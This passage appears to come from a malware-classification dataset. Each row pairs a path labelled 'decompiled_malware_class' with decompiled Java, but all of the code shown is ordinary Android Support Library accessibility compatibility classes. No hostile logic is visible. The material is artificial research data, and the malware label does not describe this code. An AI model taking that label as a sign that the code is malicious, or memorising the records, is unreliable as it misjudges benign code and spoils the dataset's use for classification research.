z);   void setBoundsInParent(  Object obj,  Rect rect);   void setBoundsInScreen(  Object obj,  Rect rect);   void setCheckable(  Object obj,  boolean z);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setClickable(  Object obj,  boolean z);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setEnabled(  Object obj,  boolean z);   void setFocusable(  Object obj,  boolean z);   void setFocused(  Object obj,  boolean z);   void setLiveRegion(  Object obj,  int i);   void setLongClickable(  Object obj,  boolean z);   void setMovementGranularities(  Object obj,  int i);   void setPackageName(  Object obj,  CharSequence charSequence);   void setParent(  Object obj,  View view);   void setParent(  Object obj,  View view,  int i);   void setPassword(  Object obj,  boolean z);   void setScrollable(  Object obj,  boolean z);   void setSelected(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setText(  Object obj,  CharSequence charSequence);   void setViewIdResourceName(  Object obj,  String str);   void setVisibleToUser(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoJellybeanImpl.code","static class AccessibilityNodeInfoJellybeanImpl extends AccessibilityNodeInfoIcsImpl {   AccessibilityNodeInfoJellybeanImpl(){   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfoCompatJellyBean.obtain(root,virtualDescendantId);   }   @Override public Object findFocus(  Object info,  int focus){     return AccessibilityNodeInfoCompatJellyBean.findFocus(info,focus);   }   @Override public Object focusSearch(  Object info,  int direction){     return AccessibilityNodeInfoCompatJellyBean.focusSearch(info,direction);   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.addChild(info,child,virtualDescendantId);   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setSource(info,root,virtualDescendantId);   }   @Override public boolean isVisibleToUser(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isVisibleToUser(info);   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){     AccessibilityNodeInfoCompatJellyBean.setVisibleToUser(info,visibleToUser);   }   @Override public boolean isAccessibilityFocused(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isAccessibilityFocused(info);   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatJellyBean.setAccesibilityFocused(info,focused);   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return AccessibilityNodeInfoCompatJellyBean.performAction(info,action,arguments);   }   @Override public void setMovementGranularities(  Object info,  int granularities){     AccessibilityNodeInfoCompatJellyBean.setMovementGranularities(info,granularities);   }   @Override public int getMovementGranularities(  Object info){     return AccessibilityNodeInfoCompatJellyBean.getMovementGranularities(info);   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setParent(info,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoJellybeanMr2Impl.code","static class AccessibilityNodeInfoJellybeanMr2Impl extends AccessibilityNodeInfoJellybeanImpl {   AccessibilityNodeInfoJellybeanMr2Impl(){   }   @Override public String getViewIdResourceName(  Object info){     return AccessibilityNodeInfoCompatJellybeanMr2.getViewIdResourceName(info);   }   @Override public void setViewIdResourceName(  Object info,  String viewId){     AccessibilityNodeInfoCompatJellybeanMr2.setViewIdResourceName(info,viewId);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoKitKatImpl.code","static class AccessibilityNodeInfoKitKatImpl extends AccessibilityNodeInfoJellybeanMr2Impl {   AccessibilityNodeInfoKitKatImpl(){   }   @Override public int getLiveRegion(  Object info){     return AccessibilityNodeInfoCompatKitKat.getLiveRegion(info);   }   @Override public void setLiveRegion(  Object info,  int mode){     AccessibilityNodeInfoCompatKitKat.setLiveRegion(info,mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoStubImpl.code","static class AccessibilityNodeInfoStubImpl implements AccessibilityNodeInfoImpl {   AccessibilityNodeInfoStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  View source){     return null;   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return null;   }   @Override public Object obtain(  Object info){     return null;   }   @Override public void addAction(  Object info,  int action){   }   @Override public void addChild(  Object info,  View child){   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return Collections.emptyList();   }   @Override public int getActions(  Object info){     return 0;   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){   }   @Override public Object getChild(  Object info,  int index){     return null;   }   @Override public int getChildCount(  Object info){     return 0;   }   @Override public CharSequence getClassName(  Object info){     return null;   }   @Override public CharSequence getContentDescription(  Object info){     return null;   }   @Override public CharSequence getPackageName(  Object info){     return null;   }   @Override public Object getParent(  Object info){     return null;   }   @Override public CharSequence getText(  Object info){     return null;   }   @Override public int getWindowId(  Object info){     return 0;   }   @Override public boolean isCheckable(  Object info){     return false;   }   @Override public boolean isChecked(  Object info){     return false;   }   @Override public boolean isClickable(  Object info){     return false;   }   @Override public boolean isEnabled(  Object info){     return false;   }   @Override public boolean isFocusable(  Object info){     return false;   }   @Override public boolean isFocused(  Object info){     return false;   }   @Override public boolean isVisibleToUser(  Object info){     return false;   }   @Override public boolean isAccessibilityFocused(  Object info){     return false;   }   @Override public boolean isLongClickable(  Object info){     return false;   }   @Override public boolean isPassword(  Object info){     return false;   }   @Override public boolean isScrollable(  Object info){     return false;   }   @Override public boolean isSelected(  Object info){     return false;   }   @Override public boolean performAction(  Object info,  int action){     return false;   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return false;   }   @Override public void setMovementGranularities(  Object info,  int granularities){   }   @Override public int getMovementGranularities(  Object info){     return 0;   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){   }   @Override public void setCheckable(  Object info,  boolean checkable){   }   @Override public void setChecked(  Object info,  boolean checked){   }   @Override public void setClassName(  Object info,  CharSequence className){   }   @Override public void setClickable(  Object info,  boolean clickable){   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){   }   @Override public void setEnabled(  Object info,  boolean enabled){   }   @Override public void setFocusable(  Object info,  boolean focusable){   }   @Override public void setFocused(  Object info,  boolean focused){   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){   }   @Override public void setLongClickable(  Object info,  boolean longClickable){   }   @Override public void setPackageName(  Object info,  CharSequence packageName){   }   @Override public void setParent(  Object info,  View parent){   }   @Override public void setPassword(  Object info,  boolean password){   }   @Override public void setScrollable(  Object info,  boolean scrollable){   }   @Override public void setSelected(  Object info,  boolean selected){   }   @Override public void setSource(  Object info,  View source){   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){   }   @Override public Object findFocus(  Object info,  int focus){     return null;   }   @Override public Object focusSearch(  Object info,  int direction){     return null;   }   @Override public void setText(  Object info,  CharSequence text){   }   @Override public void recycle(  Object info){   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){   }   @Override public String getViewIdResourceName(  Object info){     return null;   }   @Override public void setViewIdResourceName(  Object info,  String viewId){   }   @Override public int getLiveRegion(  Object info){     return 0;   }   @Override public void setLiveRegion(  Object info,  int mode){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeProviderCompat.code","public class AccessibilityNodeProviderCompat {   private static final AccessibilityNodeProviderImpl IMPL;   private final Object mProvider; interface AccessibilityNodeProviderImpl {     Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat accessibilityNodeProviderCompat);   } static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {     AccessibilityNodeProviderStubImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat compat){       return null;     }   } static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderJellyBeanImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat compat){       return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){         @Override public boolean performAction(        int virtualViewId,        int action,        Bundle arguments){           return compat.performAction(virtualViewId,action,arguments);         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String text,        int virtualViewId){           List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);           List<Object> infos=new ArrayList<>();           int infoCount=compatInfos.size();           for (int i=0; i < infoCount; i++) {             AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);             infos.add(infoCompat.getInfo());           }           return infos;         }         @Override public Object createAccessibilityNodeInfo(        int virtualViewId){           AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }       } );     }   } static class AccessibilityNodeProviderKitKatImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderKitKatImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat compat){       return AccessibilityNodeProviderCompatKitKat.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatKitKat.AccessibilityNodeInfoBridge(){         @Override public boolean performAction(        int virtualViewId,        int action,        Bundle arguments){           return compat.performAction(virtualViewId,action,arguments);         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String text,        int virtualViewId){           List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);           List<Object> infos=new ArrayList<>();           int infoCount=compatInfos.size();           for (int i=0; i < infoCount; i++) {             AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);             infos.add(infoCompat.getInfo());           }           return infos;         }         @Override public Object createAccessibilityNodeInfo(        int virtualViewId){           AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }         @Override public Object findFocus(        int focus){           AccessibilityNodeInfoCompat compatInfo=compat.findFocus(focus);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }       } );     }   } static {     if (Build.VERSION.SDK_INT >= 19) {       IMPL=new AccessibilityNodeProviderKitKatImpl();     }  else     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityNodeProviderJellyBeanImpl();     }  else {       IMPL=new AccessibilityNodeProviderStubImpl();     }   }   public AccessibilityNodeProviderCompat(){     this.mProvider=IMPL.newAccessibilityNodeProviderBridge(this);   }   public AccessibilityNodeProviderCompat(  Object provider){     this.mProvider=provider;   }   public Object getProvider(){     return this.mProvider;   }   public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int virtualViewId){     return null;   }   public boolean performAction(  int virtualViewId,  int action,  Bundle arguments){     return false;   }   public List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText(  String text,  int virtualViewId){     return null;   }   public AccessibilityNodeInfoCompat findFocus(  int focus){     return null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeProviderCompatJellyBean.code","class AccessibilityNodeProviderCompatJellyBean { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatJellyBean(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge bridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int virtualViewId){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(virtualViewId);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(text,virtualViewId);       }       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return AccessibilityNodeInfoBridge.this.performAction(virtualViewId,action,arguments);       }     } ;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeProviderCompatKitKat.code","class AccessibilityNodeProviderCompatKitKat { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     Object findFocus(    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatKitKat(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge bridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int virtualViewId){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(virtualViewId);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(text,virtualViewId);       }       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return AccessibilityNodeInfoBridge.this.performAction(virtualViewId,action,arguments);       }       @Override public AccessibilityNodeInfo findFocus(      int focus){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.findFocus(focus);       }     } ;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeProviderImpl.code","interface AccessibilityNodeProviderImpl {   Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat accessibilityNodeProviderCompat); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeProviderJellyBeanImpl.code","static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderJellyBeanImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat compat){     return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return compat.performAction(virtualViewId,action,arguments);       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);         List<Object> infos=new ArrayList<>();         int infoCount=compatInfos.size();         for (int i=0; i < infoCount; i++) {           AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);           infos.add(infoCompat.getInfo());         }         return infos;       }       @Override public Object createAccessibilityNodeInfo(      int virtualViewId){         AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }     } );   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeProviderKitKatImpl.code","static class AccessibilityNodeProviderKitKatImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderKitKatImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat compat){     return AccessibilityNodeProviderCompatKitKat.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatKitKat.AccessibilityNodeInfoBridge(){       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return compat.performAction(virtualViewId,action,arguments);       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);         List<Object> infos=new ArrayList<>();         int infoCount=compatInfos.size();         for (int i=0; i < infoCount; i++) {           AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);           infos.add(infoCompat.getInfo());         }         return infos;       }       @Override public Object createAccessibilityNodeInfo(      int virtualViewId){         AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }       @Override public Object findFocus(      int focus){         AccessibilityNodeInfoCompat compatInfo=compat.findFocus(focus);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }     } );   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeProviderStubImpl.code","static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {   AccessibilityNodeProviderStubImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat compat){     return null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordCompat.code","public class AccessibilityRecordCompat {   private static final AccessibilityRecordImpl IMPL;   private final Object mRecord; interface AccessibilityRecordImpl {     int getAddedCount(    Object obj);     CharSequence getBeforeText(    Object obj);     CharSequence getClassName(    Object obj);     CharSequence getContentDescription(    Object obj);     int getCurrentItemIndex(    Object obj);     int getFromIndex(    Object obj);     int getItemCount(    Object obj);     int getMaxScrollX(    Object obj);     int getMaxScrollY(    Object obj);     Parcelable getParcelableData(    Object obj);     int getRemovedCount(    Object obj);     int getScrollX(    Object obj);     int getScrollY(    Object obj);     AccessibilityNodeInfoCompat getSource(    Object obj);     List<CharSequence> getText(    Object obj);     int getToIndex(    Object obj);     int getWindowId(    Object obj);     boolean isChecked(    Object obj);     boolean isEnabled(    Object obj);     boolean isFullScreen(    Object obj);     boolean isPassword(    Object obj);     boolean isScrollable(    Object obj);     Object obtain();     Object obtain(    Object obj);     void recycle(    Object obj);     void setAddedCount(    Object obj,    int i);     void setBeforeText(    Object obj,    CharSequence charSequence);     void setChecked(    Object obj,    boolean z);     void setClassName(    Object obj,    CharSequence charSequence);     void setContentDescription(    Object obj,    CharSequence charSequence);     void setCurrentItemIndex(    Object obj,    int i);     void setEnabled(    Object obj,    boolean z);     void setFromIndex(    Object obj,    int i);     void setFullScreen(    Object obj,    boolean z);     void setItemCount(    Object obj,    int i);     void setMaxScrollX(    Object obj,    int i);     void setMaxScrollY(    Object obj,    int i);     void setParcelableData(    Object obj,    Parcelable parcelable);     void setPassword(    Object obj,    boolean z);     void setRemovedCount(    Object obj,    int i);     void setScrollX(    Object obj,    int i);     void setScrollY(    Object obj,    int i);     void setScrollable(    Object obj,    boolean z);     void setSource(    Object obj,    View view);     void setSource(    Object obj,    View view,    int i);     void setToIndex(    Object obj,    int i);   } static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {     AccessibilityRecordStubImpl(){     }     @Override public Object obtain(){       return null;     }     @Override public Object obtain(    Object record){       return null;     }     @Override public int getAddedCount(    Object record){       return 0;     }     @Override public CharSequence getBeforeText(    Object record){       return null;     }     @Override public CharSequence getClassName(    Object record){       return null;     }     @Override public CharSequence getContentDescription(    Object record){       return null;     }     @Override public int getCurrentItemIndex(    Object record){       return 0;     }     @Override public int getFromIndex(    Object record){       return 0;     }     @Override public int getItemCount(    Object record){       return 0;     }     @Override public int getMaxScrollX(    Object record){       return 0;     }     @Override public int getMaxScrollY(    Object record){       return 0;     }     @Override public Parcelable getParcelableData(    Object record){       return null;     }     @Override public int getRemovedCount(    Object record){       return 0;     }     @Override public int getScrollX(    Object record){       return 0;     }     @Override public int getScrollY(    Object record){       return 0;     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return null;     }     @Override public List<CharSequence> getText(    Object record){       return Collections.emptyList();     }     @Override public int getToIndex(    Object record){       return 0;     }     @Override public int getWindowId(    Object record){       return 0;     }     @Override public boolean isChecked(    Object record){       return false;     }     @Override public boolean isEnabled(    Object record){       return false;     }     @Override public boolean isFullScreen(    Object record){       return false;     }     @Override public boolean isPassword(    Object record){       return false;     }     @Override public boolean isScrollable(    Object record){       return false;     }     @Override public void recycle(    Object record){     }     @Override public void setAddedCount(    Object record,    int addedCount){     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){     }     @Override public void setChecked(    Object record,    boolean isChecked){     }     @Override public void setClassName(    Object record,    CharSequence className){     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){     }     @Override public void setEnabled(    Object record,    boolean isEnabled){     }     @Override public void setFromIndex(    Object record,    int fromIndex){     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){     }     @Override public void setItemCount(    Object record,    int itemCount){     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){     }     @Override public void setPassword(    Object record,    boolean isPassword){     }     @Override public void setRemovedCount(    Object record,    int removedCount){     }     @Override public void setScrollX(    Object record,    int scrollX){     }     @Override public void setScrollY(    Object record,    int scrollY){     }     @Override public void setScrollable(    Object record,    boolean scrollable){     }     @Override public void setSource(    Object record,    View source){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){     }     @Override public void setToIndex(    Object record,    int toIndex){     }   } static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {     AccessibilityRecordIcsImpl(){     }     @Override public Object obtain(){       return AccessibilityRecordCompatIcs.obtain();     }     @Override public Object obtain(    Object record){       return AccessibilityRecordCompatIcs.obtain(record);     }     @Override public int getAddedCount(    Object record){       return AccessibilityRecordCompatIcs.getAddedCount(record);     }     @Override public CharSequence getBeforeText(    Object record){       return AccessibilityRecordCompatIcs.getBeforeText(record);     }     @Override public CharSequence getClassName(    Object record){       return AccessibilityRecordCompatIcs.getClassName(record);     }     @Override public CharSequence getContentDescription(    Object record){       return AccessibilityRecordCompatIcs.getContentDescription(record);     }     @Override public int getCurrentItemIndex(    Object record){       return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);     }     @Override public int getFromIndex(    Object record){       return AccessibilityRecordCompatIcs.getFromIndex(record);     }     @Override public int getItemCount(    Object record){       return AccessibilityRecordCompatIcs.getItemCount(record);     }     @Override public Parcelable getParcelableData(    Object record){       return AccessibilityRecordCompatIcs.getParcelableData(record);     }     @Override public int getRemovedCount(    Object record){       return AccessibilityRecordCompatIcs.getRemovedCount(record);     }     @Override public int getScrollX(    Object record){       return AccessibilityRecordCompatIcs.getScrollX(record);     }     @Override public int getScrollY(    Object record){       return AccessibilityRecordCompatIcs.getScrollY(record);     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));     }     @Override public List<CharSequence> getText(    Object record){       return AccessibilityRecordCompatIcs.getText(record);     }     @Override public int getToIndex(    Object record){       return AccessibilityRecordCompatIcs.getToIndex(record);     }     @Override public int getWindowId(    Object record){       return AccessibilityRecordCompatIcs.getWindowId(record);     }     @Override public boolean isChecked(    Object record){       return AccessibilityRecordCompatIcs.isChecked(record);     }     @Override public boolean isEnabled(    Object record){       return AccessibilityRecordCompatIcs.isEnabled(record);     }     @Override public boolean isFullScreen(    Object record){       return AccessibilityRecordCompatIcs.isFullScreen(record);     }     @Override public boolean isPassword(    Object record){       return AccessibilityRecordCompatIcs.isPassword(record);     }     @Override public boolean isScrollable(    Object record){       return AccessibilityRecordCompatIcs.isScrollable(record);     }     @Override public void recycle(    Object record){       AccessibilityRecordCompatIcs.recycle(record);     }     @Override public void setAddedCount(    Object record,    int addedCount){       AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){       AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);     }     @Override public void setChecked(    Object record,    boolean isChecked){       AccessibilityRecordCompatIcs.setChecked(record,isChecked);     }     @Override public void setClassName(    Object record,    CharSequence className){       AccessibilityRecordCompatIcs.setClassName(record,className);     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){       AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){       AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);     }     @Override public void setEnabled(    Object record,    boolean isEnabled){       AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);     }     @Override public void setFromIndex(    Object record,    int fromIndex){       AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){       AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);     }     @Override public void setItemCount(    Object record,    int itemCount){       AccessibilityRecordCompatIcs.setItemCount(record,itemCount);     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){       AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);     }     @Override public void setPassword(    Object record,    boolean isPassword){       AccessibilityRecordCompatIcs.setPassword(record,isPassword);     }     @Override public void setRemovedCount(    Object record,    int removedCount){       AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);     }     @Override public void setScrollX(    Object record,    int scrollX){       AccessibilityRecordCompatIcs.setScrollX(record,scrollX);     }     @Override public void setScrollY(    Object record,    int scrollY){       AccessibilityRecordCompatIcs.setScrollY(record,scrollY);     }     @Override public void setScrollable(    Object record,    boolean scrollable){       AccessibilityRecordCompatIcs.setScrollable(record,scrollable);     }     @Override public void setSource(    Object record,    View source){       AccessibilityRecordCompatIcs.setSource(record,source);     }     @Override public void setToIndex(    Object record,    int toIndex){       AccessibilityRecordCompatIcs.setToIndex(record,toIndex);     }   } static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {     AccessibilityRecordIcsMr1Impl(){     }     @Override public int getMaxScrollX(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);     }     @Override public int getMaxScrollY(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){       AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){       AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);     }   } static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {     AccessibilityRecordJellyBeanImpl(){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){       AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityRecordJellyBeanImpl();       return;     }     if (Build.VERSION.SDK_INT >= 15) {       IMPL=new AccessibilityRecordIcsMr1Impl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityRecordIcsImpl();     }  else {       IMPL=new AccessibilityRecordStubImpl();     }   }   public AccessibilityRecordCompat(  Object record){     this.mRecord=record;   }   public Object getImpl(){     return this.mRecord;   }   public static AccessibilityRecordCompat obtain(  AccessibilityRecordCompat record){     return new AccessibilityRecordCompat(IMPL.obtain(record.mRecord));   }   public static AccessibilityRecordCompat obtain(){     return new AccessibilityRecordCompat(IMPL.obtain());   }   public void setSource(  View source){     IMPL.setSource(this.mRecord,source);   }   public void setSource(  View root,  int virtualDescendantId){     IMPL.setSource(this.mRecord,root,virtualDescendantId);   }   public AccessibilityNodeInfoCompat getSource(){     return IMPL.getSource(this.mRecord);   }   public int getWindowId(){     return IMPL.getWindowId(this.mRecord);   }   public boolean isChecked(){     return IMPL.isChecked(this.mRecord);   }   public void setChecked(  boolean isChecked){     IMPL.setChecked(this.mRecord,isChecked);   }   public boolean isEnabled(){     return IMPL.isEnabled(this.mRecord);   }   public void setEnabled(  boolean isEnabled){     IMPL.setEnabled(this.mRecord,isEnabled);   }   public boolean isPassword(){     return IMPL.isPassword(this.mRecord);   }   public void setPassword(  boolean isPassword){     IMPL.setPassword(this.mRecord,isPassword);   }   public boolean isFullScreen(){     return IMPL.isFullScreen(this.mRecord);   }   public void setFullScreen(  boolean isFullScreen){     IMPL.setFullScreen(this.mRecord,isFullScreen);   }   public boolean isScrollable(){     return IMPL.isScrollable(this.mRecord);   }   public void setScrollable(  boolean scrollable){     IMPL.setScrollable(this.mRecord,scrollable);   }   public int getItemCount(){     return IMPL.getItemCount(this.mRecord);   }   public void setItemCount(  int itemCount){     IMPL.setItemCount(this.mRecord,itemCount);   }   public int getCurrentItemIndex(){     return IMPL.getCurrentItemIndex(this.mRecord);   }   public void setCurrentItemIndex(  int currentItemIndex){     IMPL.setCurrentItemIndex(this.mRecord,currentItemIndex);   }   public int getFromIndex(){     return 